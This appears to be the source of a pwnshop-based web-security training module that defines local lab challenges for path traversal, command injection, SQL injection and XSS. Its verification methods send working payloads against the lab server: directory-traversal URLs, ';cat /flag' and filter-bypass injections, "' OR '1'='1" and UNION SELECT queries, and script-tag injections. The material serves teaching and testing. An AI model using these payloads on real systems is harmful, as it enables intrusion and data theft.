import requests
import pwnshop
import struct
import time
import pwn
import os

ENDPOINT_NAMES_STATIC_FILES = [
    "files", "data", "static", "content", "filesystem",  
    "assets", "resources", "media", "public", "storage",
    "library", "downloads", "archive", "docs", "cdn",
    "serve", "shared", "hosted", "repository", "dump",
    "payload", "items", "output", "package", "deliverables",
    "webfiles", "statics", "filebank", "blob", "container"
]

ENDPOINT_NAMES_CHALLENGE = [
    "challenge", "problem", "assignment", "level", "resource", "serve",
    "task", "puzzle", "mission", "quest", "objective", 
    "exercise", "test", "trial", "adventure", "step", 
    "goal", "scenario", "activity", "competition", "stage", 
    "event", "milestone", "checkpoint", "dare", "initiative"
]

ENDPOINT_NAMES_LOGIN = [
    "login", "signin", "auth", "authenticate", "access",
    "session", "logon", "enter", "credentials", "user-login",
    "account", "token", "authorize", "authentication", "gateway",
    "login-page", "log", "portal", "login-session", "identity"
]

PARAMETER_NAMES_DIRECTORY = [
    "directory", "path", "folder", "prefix", "absolute-path",
    "location", "filepath", "target", "destination", "dir",
    "root", "basepath", "subdirectory", "output-path", "start",
    "filedir", "topdir", "top-path", "directory-path", "storage-path"
]

PARAMETER_NAMES_TIMEZONE = [
    "timezone", "time-zone", "tz", "time-zon", "tzone",
    "region", "zone", "time-region", "time-area", "time-location",
    "timezone-id", "tz-region", "tz-tag", "tz-value", "timezone-value",
    "tzid", "timezone-val"
]

PARAMETER_NAMES_FILEPATH = [
    "filepath", "file-path", "path", "file", "file-location",
    "file-name", "filename", "absolute-path", "full-path", "file-or-dir",
    "file-or-directory", "target-file", "path-file", "the-file", "output-file",
    "file-loc", "file-pathname", "file-target", "file-dest", "file-ref"
]

PARAMETER_NAMES_USERNAME = [
    "username", "user", "user-name", "login-name", "account", "account-name",
    "userid", "user-id", "user-handle", "user-alias", "uid",
    "identity", "uname", "account-name", "login-name",
    "profile-name", "login-id", "account-id", "identifier"
]

PARAMETER_NAMES_PASSWORD = [
    "password", "pass", "passwd", "pw", "secret",
    "key", "passphrase", "login-pw", "pword",
    "access-code", "security-token", "auth-pw",
    "user-secret", "account-password", "login-password",
]


class PathTraversal(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "path-traversal.py"
    flask_host = "challenge.localhost"
    flask_port = 80

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.endpoint = self.random.choice(ENDPOINT_NAMES_STATIC_FILES)

    def verify(self, **kwargs):
        os.makedirs(f"{self.work_dir}/files", exist_ok=True)
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            # fucking requests always fucking normalizes the fucking URL???
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}/../../../../../flag HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                assert self.flag in r.readall()

class PathTraversalStripped(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "path-traversal.py"
    strip_dots = True
    flask_host = "challenge.localhost"
    flask_port = 80

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.endpoint = self.random.choice(ENDPOINT_NAMES_STATIC_FILES)

    def verify(self, **kwargs):
        os.makedirs(f"{self.work_dir}/files/asdf", exist_ok=True)
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}/../../../../../flag HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                assert self.flag not in r.readall()
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}/asdf/../../../../../flag HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                assert self.flag in r.readall()

class CommandInjectionLS(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "cmdi-ls.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    reset_uid = True
    reset_path = True
    description = "Welcome to the dirlister service! Please choose a directory to list the files of:"
    command = "ls"
    default_value = "/challenge"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.endpoint = self.random.choice(ENDPOINT_NAMES_CHALLENGE)
        self.parameter = self.random.choice(PARAMETER_NAMES_DIRECTORY)

    def verify(self, **kwargs):
        os.makedirs(f"{self.work_dir}/files/asdf", exist_ok=True)
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}?{self.parameter}=%3bcat%20/flag HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                assert self.flag in r.readall()

class CommandInjectionEnv(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "cmdi-ls.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    reset_uid = True
    reset_path = True
    description = "Welcome to the timezone service! Please choose a timezone to get the time there."
    command = "date"
    default_value = "MST"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.endpoint = self.random.choice(ENDPOINT_NAMES_CHALLENGE)
        self.parameter = self.random.choice(PARAMETER_NAMES_TIMEZONE)

    def verify(self, **kwargs):
        os.makedirs(f"{self.work_dir}/files/asdf", exist_ok=True)
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}?{self.parameter}=asdf%3bcat%20/flag%20 HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                assert self.flag in r.readall()

class CommandInjectionTouch(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "cmdi-ls.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    reset_uid = True
    reset_path = True
    description = "Welcome to the touch service! Please choose a file to touch:"
    command = "touch"
    default_value = "/challenge/PWN"
    hide_output = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.endpoint = self.random.choice(ENDPOINT_NAMES_CHALLENGE)
        self.parameter = self.random.choice(PARAMETER_NAMES_FILEPATH)

    def verify(self, **kwargs):
        os.makedirs(f"{self.work_dir}/files/asdf", exist_ok=True)
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}?{self.parameter}=asdf%3bcat%20/flag%3e{self.work_dir}/flg%20/flag%20 HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                r.readall()
                assert self.flag in open(f"{self.work_dir}/flg", "rb").read()


class CommandInjectionLSPipe(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "cmdi-ls.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    reset_uid = True
    reset_path = True
    filtered_chars = ";"
    description = "Welcome to the dirlister service! Please choose a directory to list the files of:"
    command = "ls"
    default_value = "/challenge"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.endpoint = self.random.choice(ENDPOINT_NAMES_CHALLENGE)
        self.parameter = self.random.choice(PARAMETER_NAMES_DIRECTORY)

    def verify(self, **kwargs):
        os.makedirs(f"{self.work_dir}/files/asdf", exist_ok=True)
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}?{self.parameter}=%3bcat%20/flag HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                assert self.flag not in r.readall()
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}?{self.parameter}=%7ccat%20/flag HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                assert self.flag in r.readall()

class CommandInjectionLSQuote(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "cmdi-ls.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    reset_uid = True
    reset_path = True
    quote_character = "'"
    description = "Welcome to the dirlister service! Please choose a directory to list the files of:"
    command = "ls"
    default_value = "/challenge"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.endpoint = self.random.choice(ENDPOINT_NAMES_CHALLENGE)
        self.parameter = self.random.choice(PARAMETER_NAMES_DIRECTORY)

    def verify(self, **kwargs):
        os.makedirs(f"{self.work_dir}/files/asdf", exist_ok=True)
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}?{self.parameter}=%3bcat%20/flag HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                assert self.flag not in r.readall()
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}?{self.parameter}=%27%3bcat%20/flag%3b%27 HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                assert self.flag in r.readall()

class CommandInjectionLSFilter(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "cmdi-ls.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    reset_uid = True
    reset_path = True
    filtered_chars = ";&|><()`$"
    description = "Welcome to the dirlister service! Please choose a directory to list the files of:"
    command = "ls"
    default_value = "/challenge"

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.endpoint = self.random.choice(ENDPOINT_NAMES_CHALLENGE)
        self.parameter = self.random.choice(PARAMETER_NAMES_DIRECTORY)

    def verify(self, **kwargs):
        os.makedirs(f"{self.work_dir}/files/asdf", exist_ok=True)
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}?{self.parameter}=%3bcat%20/flag HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                assert self.flag not in r.readall()
            with self.proxy_local_connection(self.flask_port) as r:
                r.send(f"GET /{self.endpoint}?{self.parameter}=%0acat%20/flag HTTP/1.1\nHost: {self.flask_host}:80\n\n")
                assert self.flag in r.readall()

class SQLInjectionPin(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "sqli-pw.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    pw_name = "pin"
    guest_pw = 1337
    admin_pw_code = "random.randrange(2**32, 2**63)"
    admin_print_flag = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.endpoint = self.random.choice(ENDPOINT_NAMES_LOGIN)
        self.username_parameter = self.random.choice(PARAMETER_NAMES_USERNAME)
        self.password_parameter = "pin"

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_port(80) as pp:
                s = requests.Session()
                pr = s.post(
                    f"http://{self.hostname}:{pp}/{self.endpoint}",
                    headers={"Host": self.flask_host},
                    data={self.username_parameter: "admin", self.password_parameter: "1 OR 1=1"}
                )
                assert self.flag in pr.content

class SQLInjectionPassword(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "sqli-pw.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    pw_name = "password"
    guest_pw = "password"
    quote_character = "'"
    admin_pw_code = "os.urandom(8)"
    admin_print_flag = True

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.endpoint = self.random.choice(ENDPOINT_NAMES_LOGIN)
        self.username_parameter = self.random.choice(PARAMETER_NAMES_USERNAME)
        self.password_parameter = self.random.choice(PARAMETER_NAMES_PASSWORD)

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_port(80) as pp:
                s = requests.Session()
                pr = s.post(
                    f"http://{self.hostname}:{pp}/{self.endpoint}",
                    headers={"Host": self.flask_host},
                    data={self.username_parameter: "admin", self.password_parameter: "1' OR '1'='1"}
                )
                assert self.flag in pr.content

class SQLInjectionUnion(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "sqli-userquery.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    table_identifier = "users"

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_port(80) as pp:
                s = requests.Session()
                pr = s.get(
                    f"http://{self.hostname}:{pp}",
                    headers={"Host": self.flask_host},
                    params={"query": """admin" UNION SELECT password FROM users where "A"="A""" }
                )
                assert self.flag in pr.content

class SQLInjectionSchema(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "sqli-userquery.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    table_identifier = "{random_user_table}"

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_port(80) as pp:
                s = requests.Session()
                pr = s.get(
                    f"http://{self.hostname}:{pp}",
                    headers={"Host": self.flask_host},
                    params={"query": """admin" UNION SELECT tbl_name FROM sqlite_master where "A"="A""" }
                )
                tbl = "users_" + pr.text.split("users_")[-1].split("<")[0]
                pr = s.get(
                    f"http://{self.hostname}:{pp}",
                    headers={"Host": self.flask_host},
                    params={"query": f"""admin" UNION SELECT password FROM {tbl} where "A"="A""" }
                )
                assert self.flag in pr.content

class SQLInjectionBlind(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "sqli-pw.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    pw_name = "password"
    guest_pw = "password"
    quote_character = "'"
    admin_pw_code = """open("/flag").read()"""
    admin_print_flag = False

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_port(80) as pp:
                s = requests.Session()
                pr = s.post(
                    f"http://{self.hostname}:{pp}",
                    headers={"Host": self.flask_host},
                    data={"username": "admin", "password": "1' OR '1'='1"}
                )
                assert pr.status_code == 200
                assert self.flag not in pr.content

class VictimRequests(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "victim-requests.py"

class VictimSelenium(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "victim-selenium.py"
    reward_alert = True

class PWNPostBasic(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "pwnpost-basic.py"
    flask_host = "challenge.localhost"
    flask_port = 80

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_port(80) as pp:
                pr = requests.post(
                    f"http://{self.hostname}:{pp}/",
                    headers={"Host": self.flask_host},
                    data={"content": "<input>"}
                )
                assert pr.status_code == 200

class XSSStoredHTML(pwnshop.ChallengeGroup):
    challenges = [ PWNPostBasic, VictimRequests ]
    challenge_names = [ "server", "victim" ]

    def verify(self, **kwargs):
        self.challenge_instances[0].verify(**kwargs)
        #self.challenge_instances[1].verify(**kwargs)

        with self.challenge_instances[0].run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_port(80) as pp:
                pr = requests.post(
                    f"http://{self.hostname}:{pp}/",
                    headers={"Host": self.challenge_instances[0].flask_host},
                    data={"content": "<input>"}
                )

            with self.challenge_instances[1].run_challenge(**kwargs) as victim:
                assert self.flag in victim.readall()

class XSSStoredAlert(pwnshop.ChallengeGroup):
    challenges = [ PWNPostBasic, VictimSelenium ]
    challenge_names = [ "server", "victim" ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.challenge_instances[1].specify_url = False

    def verify(self, **kwargs):
        self.challenge_instances[0].verify(**kwargs)
        #self.challenge_instances[1].verify(**kwargs)

        with self.challenge_instances[0].run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_port(80) as pp:
                pr = requests.post(
                    f"http://{self.hostname}:{pp}/",
                    headers={"Host": self.challenge_instances[0].flask_host},
                    data={"content": "<script>alert(1);</script>"}
                )

            with self.challenge_instances[1].run_challenge(**kwargs) as victim:
                assert self.flag in victim.readall()

class PWNPostEphemeral(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "pwnpost-ephemeral.py"
    flask_host = "challenge.localhost"
    flask_port = 80

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_port(80) as pp:
                pr = requests.get(
                    f"http://{self.hostname}:{pp}/",
                    headers={"Host": self.flask_host},
                    params={"msg": "<input>"}
                )
                assert pr.status_code == 200

class XSSReflected(pwnshop.ChallengeGroup):
    challenges = [ PWNPostEphemeral, VictimSelenium ]
    challenge_names = [ "server", "victim" ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.challenge_instances[1].specify_url = True

    def verify(self, **kwargs):
        self.challenge_instances[0].verify(**kwargs)
        #self.challenge_instances[1].verify(**kwargs)

        with self.challenge_instances[0].run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.challenge_instances[1].run_challenge(argv=["http://challenge.localhost:80/?msg=<script>alert(1);</script>"], **kwargs) as victim:
                assert self.flag in victim.readall()

class XSSContext(pwnshop.ChallengeGroup):
    challenges = [ PWNPostEphemeral, VictimSelenium ]
    challenge_names = [ "server", "victim" ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.challenge_instances[1].specify_url = True
        self.challenge_instances[0].msg_in_textarea = True

    def verify(self, **kwargs):
        self.challenge_instances[0].verify(**kwargs)
        #self.challenge_instances[1].verify(**kwargs)

        with self.challenge_instances[0].run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.challenge_instances[1].run_challenge(argv=["http://challenge.localhost:80/?msg=</textarea><script>alert(1);</script>"], **kwargs) as victim:
                assert self.flag in victim.readall()

class PWNPostFull(pwnshop.PythonChallenge):
    TEMPLATE_PATH = "pwnpost-full.py"
    flask_host = "challenge.localhost"
    flask_port = 80
    publish_method = "GET"

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            test_msg = "TESTING "*4
            with self.proxy_local_port(80) as pp:
                s = requests.Session()
                assert s.post(
                    f"http://{self.hostname}:{pp}/login",
                    headers={"Host": self.flask_host},
                    data={"username": "hacker", "password": "1337"}
                ).status_code == 200
                assert s.post(
                    f"http://{self.hostname}:{pp}/draft",
                    headers={"Host": self.flask_host},
                    data={"content": test_msg}
                ).status_code == 200

                g = requests.Session()
                pr = g.post(
                    f"http://{self.hostname}:{pp}/login",
                    headers={"Host": self.flask_host},
                    data={"username": "guest", "password": "password"}
                )
                assert pr.status_code == 200
                assert test_msg not in pr.text
                assert test_msg[:10] in pr.text

                assert (s.get if self.publish_method == "GET" else s.post)(
                    f"http://{self.hostname}:{pp}/publish",
                    headers={"Host": self.flask_host},
                ).status_code == 200

                pr = g.get(
                    f"http://{self.hostname}:{pp}/",
                    headers={"Host": self.flask_host},
                )
                assert pr.status_code == 200
                assert test_msg in pr.text

class XSSPublishGet(pwnshop.ChallengeGroup):
    challenges = [ PWNPostFull, VictimSelenium ]
    challenge_names = [ "server", "victim" ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.challenge_instances[0].publish_method = "GET"
        self.challenge_instances[1].specify_url = False
        self.challenge_instances[1].reward_alert = False
        self.challenge_instances[1].form_fields = {
            "username": '"admin"',
            "password": """open("/flag").read().strip()"""
        }

    def verify(self, **kwargs):
        self.challenge_instances[0].verify(**kwargs)
        #self.challenge_instances[1].verify(**kwargs)

        with self.challenge_instances[0].run_challenge(**kwargs) as process:
            process.readuntil("Running on")
            with self.proxy_local_port(80) as pp:
                s = requests.Session()
                assert s.post(
                    f"http://{self.hostname}:{pp}/login",
                    headers={"Host": self.challenge_instances[0].flask_host},
                    data={"username": "hacker", "password": "1337"}
                ).status_code == 200

                script = f"""<script>fetch("/publish", {{method: "{self.challenge_instances[0].publish_method}" }})</script>"""
                assert s.post(
                    f"http://{self.hostname}:{pp}/draft",
                    headers={"Host": self.challenge_instances[0].flask_host},
                    data={"content": script, "publish": True}
                ).status_code == 200

                with self.challenge_instances[1].run_challenge(**kwargs) as victim:
                    victim.wait()

                assert self.flag in s.get(
                    f"http://{self.hostname}:{pp}/",
                    headers={"Host": self.challenge_instances[0].flask_host},
                ).content

class XSSPublishPost(XSSPublishGet):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.challenge_instances[0].publish_method = "POST"

class XSSExfilCookie(XSSPublishPost):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.challenge_instances[0].publish_method = "POST"
        self.challenge_instances[0].disable_admin_posting = True
        self.challenge_instances[0].insecure_cookie = True
        self.challenge_instances[0].show_own_drafts = True
        self.challenge_instances[0].admin_pw_code = """flag[-20:]"""
        self.challenge_instances[1].form_fields = {
            "username": '"admin"',
            "password": """open("/flag").read().strip()[-20:]"""
        }

    def verify(self, **kwargs):
        self.challenge_instances[0].verify(**kwargs)
